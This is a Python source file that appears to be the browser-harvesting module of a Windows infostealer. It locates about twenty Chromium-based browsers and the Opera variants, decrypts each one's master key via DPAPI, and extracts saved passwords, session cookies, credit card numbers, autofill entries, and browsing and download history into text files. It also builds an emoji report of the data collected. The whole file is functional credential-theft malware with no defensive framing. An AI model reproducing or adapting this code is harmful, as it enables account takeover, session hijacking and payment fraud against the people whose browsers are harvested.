from os import remove, environ, makedirs
from os.path import join, exists
from glob import glob
from base64 import b64decode
import json
from win32crypt import CryptUnprotectData
from manager.logger import Log
from shutil import copy2
from shadowcopy import shadow_copy
from sqlite3 import connect
from Crypto.Cipher import AES
from datetime import datetime, timedelta
from preferences.config import config

logins = ''''''
cookies = ''''''
cookies_list = []
history = ''''''
downhistory = ''''''
cards = ''''''
autofills = ''''''
msgInfo = ''''''

class Types:
    class Cookie:
        def __init__(self, host, name, path, value, expires):
            self.host = host
            self.name = name
            self.path = path
            self.value = value
            self.expires = expires

        def to_netscape(self):
            return f'{self.host}\t{"FALSE" if self.expires == 0 else "TRUE"}\t{self.path}\t{"FALSE" if self.host.startswith(".") else "TRUE"}\t{self.expires}\t{self.name}\t{self.value}'

        def to_dict(self):
            return {
                "domain": self.host,
                "name": self.name,
                "value": self.value,
                "path": self.path,
                "expires": self.expires,
                "httpOnly": not self.expires == 0,
                "secure": not self.host.startswith(".")
            }
        
        def __str__(self):
            return json.dumps(self.to_dict())
    
    class Login:
        def __init__(self, url, username, password):
            self.url = url
            self.username = username
            self.password = password
            
        def __str__(self):
            return f"URL: {self.url}\tUsername: {self.username}\tPassword: {self.password}"
        
    class DownHistory:
        def __init__(self, url, local_path):
            self.url = url
            self.local_path = local_path
        
        def __str__(self):
            return f"Download URL: {self.url}\nLocal Path: {self.local_path}"
    
    class History:
        def __init__(self, url, title, visited_time):
            self.url = url
            self.title = title
            self.visited_time = visited_time

        def time(self):
            try: return str(datetime(1601, 1, 1) + timedelta(microseconds=self.visited_time))
            except: return "Can't decode"

        def __str__(self):
            return f"URL: {self.url}\nTitle: {self.title}\nVisit Time: {self.time()}"
        
    class Autofill:
        def __init__(self, name, value):
            self.name = name
            self.value = value
        
        def __str__(self):
            return f"Name: {self.name}\nValue: {self.value}"

    class CreditCard:
        def __init__(self, name, number, exp_mth, exp_year, added_date):
            self.name = name
            self.number = number
            self.exp_mth = exp_mth
            self.exp_year = exp_year
            self.added_date = added_date
        
        def __str__(self):
            return f"Name On Card: {self.name}\nCard Number: {self.number}\nExpires On: {self.exp_mth} / {self.exp_year}\nAdded On: {datetime.fromtimestamp(self.added_date)}"

def get_master_key(path: str):
    if not exists(path):
        return None
    local_state_path = join(path, "Local State")
    if not exists(local_state_path):
        return None
    with open(local_state_path, "r", encoding="utf-8") as f:
        c = f.read()
    if 'os_crypt' not in c:
        return None
    local_state = json.loads(c)
    master_key = b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    try:
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    except Exception as e: Log(f"{path} Local State ---> {e}")
        

def decrypt_password(buff: bytes, master_key: bytes):
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()  
    return decrypted_pass


def get_login_data(path, master_key, blink = False):
    try:
        global logins
        if not blink:
            num = path.rfind("\\")
            profile = path[num+1:]
            logins += f"===============================\n\n\n{profile}:\n\n"
        login_db = join(config.pathToLogs, "lwincache.db")
        shadow_copy(join(path, "Login Data"), login_db)
        conn = connect(login_db)
        cursor = conn.cursor()

        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for row in cursor.fetchall():
            # 0: url, 1: username, 2: encrypted_password
            decrypted_password = decrypt_password(row[2], master_key)

            alldatapass = Types.Login(row[0], row[1], decrypted_password)
            logins += str(alldatapass) + "\n"

        conn.close()
        remove(login_db)
    except Exception as e: Log(f"{path} logins ---> {e}")

def get_web_history(path, blink = False):
    try:
        global history
        if not blink:
            num = path.rfind("\\")
            profile = path[num+1:]
            history += f"===============================\n\n\n{profile}:\n\n"
        HistorySQL = "SELECT url FROM visits"
        HistoryLinksSQL = "SELECT url, title, last_visit_time FROM urls WHERE id=%d"
        history_db = join(config.pathToLogs, "hwincache.db")
        copy2(join(path, "History"), history_db)
        conn = connect(history_db)
        cursor = conn.cursor()

        for result in cursor.execute(HistorySQL).fetchall():
            data = cursor.execute(HistoryLinksSQL % result[0]).fetchone()
            # 0: url, 1: title, 2: visited_time
            result = str(Types.History(data[0], data[1], data[2]))
            if result in history:
                continue
            history += result + "\n\n"
        
        conn.close()
        remove(history_db)
    except Exception as e:
        Log(f"{path} history ---> {e}")

def get_downloads(path, blink = False):
    try:
        global downhistory
        if not blink:
            num = path.rfind("\\")
            profile = path[num+1:]
            downhistory += f"===============================\n\n\n{profile}:\n\n"
        downloads_db = join(config.pathToLogs, "dwincache.db")
        copy2(join(path, "History"), downloads_db)
        conn = connect(downloads_db)
        cursor = conn.cursor()
        cursor.execute('SELECT tab_url, target_path FROM downloads')
        for row in cursor.fetchall():
            if not all(row[:1]): continue
            downhistory += str(Types.DownHistory(row[0], row[1])) + "\n\n"

        conn.close()
        remove(downloads_db)
    except Exception as e:
        Log(f"{path} downhistory ---> {e}")

def get_cookies(path, master_key, blink = False):
    global cookies
    global cookies_list
    try:
        if not blink:
            num = path.rfind("\\")
            profile = path[num+1:]
            cookies += f"===============================\n\n\n{profile}:\n\n"
        if not exists(join(path, "Network", "Cookies")): return None
        cookie_db = join(config.pathToLogs, "cwincache.db")
        shadow_copy(join(path, "Network", "Cookies"), cookie_db)
        conn = connect(cookie_db)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies ORDER BY host_key ASC")
        for row in cursor.fetchall():
            if not all(row[:4]): continue

            cookie_value = decrypt_password(row[3], master_key)
            cookie_line = Types.Cookie(row[0], row[1], row[2], cookie_value, row[4])
            cookies_list.append(str(cookie_line))

        cookies += '[\n\t' + ',\n\t'.join(cookies_list) + '\n]\n'
        cookies_list.clear()
        
        conn.close()
        remove(cookie_db)
    except Exception as e:
        Log(f"{path} cookies ---> {e}")

def get_autofils(path, blink = False):
    try:
        global autofills
        if not blink:
            num = path.rfind("\\")
            profile = path[num+1:]
            autofills += f"===============================\n\n\n{profile}:\n\n"
        webdata = f'{path}\\Web Data'
        if not exists(webdata): return None

        copy2(webdata, join(config.pathToLogs, "wwincache.db"))
        conn = connect(join(config.pathToLogs, "wwincache.db"))
        cursor = conn.cursor()
        cursor.execute('SELECT name, value FROM autofill')
        for row in cursor.fetchall():
            if not all(row[:2]): continue
            autofills += str(Types.Autofill(row[0], row[1])) + "\n\n"

        conn.close()
        remove(join(config.pathToLogs, "wwincache.db"))
    except Exception as e:
        Log(f"{path} autofils ---> {e}")

def get_credit_cards(path, master_key, blink = False):
    try:
        global cards
        if not blink:
            num = path.rfind("\\")
            profile = path[num+1:]
            cards += f"===============================\n\n\n{profile}:\n\n"
        cards_db = join(config.pathToLogs, "crwincache.db")
        if not exists(join(path, "Web Data")): return None

        copy2(join(path, "Web Data"), cards_db)
        conn = connect(cards_db)
        cursor = conn.cursor()
        cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
        for row in cursor.fetchall():
            # 0: name, # 1: exp_date,
            if not row[:4]:
                continue
            card_number = decrypt_password(row[3], master_key)
            cards += str(Types.CreditCard(row[0], card_number, row[1], row[2], row[4])) + "\n\n"

        conn.close()
        remove(cards_db)
    except Exception as e:
        Log(f"{path} cards ---> {e}")

def Write(pathToLogs, browser):
    global logins
    global cookies
    global history
    global downhistory
    global cards
    global autofills
    global msgInfo
    collected = False

    if logins or cookies or history or downhistory or cards or autofills:
        try:
            msgInfo+=f"\n🔍{browser}"
            makedirs(join(pathToLogs, browser), exist_ok=True)
            collected = True
        except: pass


    if (logins):
        with open(join(pathToLogs, browser, "logins.txt"), "w", encoding="utf-8") as f:
            f.write(logins)
        msgInfo+="\n∟🔑logins"
    
    if (history):
        with open(join(pathToLogs, browser, "history.txt"), "w", encoding="utf-8") as f:
            f.write(history)
        msgInfo+="\n∟📰history"
    
    if (downhistory):
        with open(join(pathToLogs, browser, "downhistory.txt"), "w", encoding="utf-8") as f:
            f.write(downhistory)
        msgInfo+="\n∟📥downhistory"
    
    if (cookies):
        with open(join(pathToLogs, browser, "cookies.txt"), "w", encoding="utf-8") as f:
            f.write(cookies)
        msgInfo+="\n∟🍪cookies"
    
    if (autofills):
        with open(join(pathToLogs, browser, "autofills.txt"), "w", encoding="utf-8") as f:
            f.write(autofills)
        msgInfo+="\n∟⌨autofills"
    
    if (cards):
        with open(join(pathToLogs, browser, "cards.txt"), "w", encoding="utf-8") as f:
            f.write(cards)
        msgInfo+="\n∟💳cards"
        
    if collected:
        msgInfo+="\n"
    
    logins = ''''''
    cookies = ''''''
    history = ''''''
    downhistory = ''''''
    cards = ''''''
    autofills = ''''''

def Chromium():
    global logins
    global cookies
    global history
    global downhistory
    global cards
    global autofills
    global msgInfo

    Log("===========Chromium===========")
    msgInfo+="\n<b>🌐Browsers🌐</b>"

    local = environ["LOCALAPPDATA"]
    roaming = environ["APPDATA"]
    pathToLogs = join(config.pathToLogs, "Browsers")

    browsers = {
        'Amigo': local + '\\Amigo\\User Data',
        'Torch': local + '\\Torch\\User Data',
        'Kometa': local + '\\Kometa\\User Data',
        'Orbitum': local + '\\Orbitum\\User Data',
        'CentBrowser': local + '\\CentBrowser\\User Data',
        '7star': local + '\\7Star\\7Star\\User Data',
        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': local + '\\Vivaldi\\User Data',
        'Chrome_SXS': local + '\\Google\\Chrome SxS\\User Data',
        'Chrome': local + '\\Google\\Chrome\\User Data',
        'EpicPrivacyBrowser': local + '\\Epic Privacy Browser\\User Data',
        'Edge': local + '\\Microsoft\\Edge\\User Data',
        'Uran': local + '\\uCozMedia\\Uran\\User Data',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data',
        'Iridium': local + '\\Iridium\\User Data',
        'CocCoc': local + '\\CocCoc\\Browser\\User Data'
    }

    blink_directory = {
        'Opera': local + '\\Opera Software\\Opera Stable\\',
        'Opera_2': roaming + '\\Opera Software\\Opera Stable\\',
        'OperaGX': local + '\\Programs\\Opera GX\\',
    }

    for key, value in browsers.items():
        master_key = get_master_key(value)
        matching_folders = glob(join(value, "Default"))
        buff = glob(join(value, "Profile*"))
        for profile in buff:
            matching_folders.append(profile)

        if matching_folders:
            for profile_path in matching_folders:
                try:
                    get_login_data(profile_path, master_key)
                    get_web_history(profile_path)
                    get_downloads(profile_path)
                    get_cookies(profile_path, master_key)
                    get_autofils(profile_path)
                    get_credit_cards(profile_path, master_key)
                except Exception as error:
                    Log(f"{profile_path} ---> {error}")
                    pass
            Write(pathToLogs, key)
    
    for key, value in blink_directory.items():
        master_key = get_master_key(value)
        get_login_data(value, master_key, True)
        get_web_history(value, True)
        get_downloads(value, True)
        get_cookies(value, master_key, True)
        get_credit_cards(value, master_key, True)
        get_autofils(value, True)
        Write(pathToLogs, key)
    
    return msgInfo
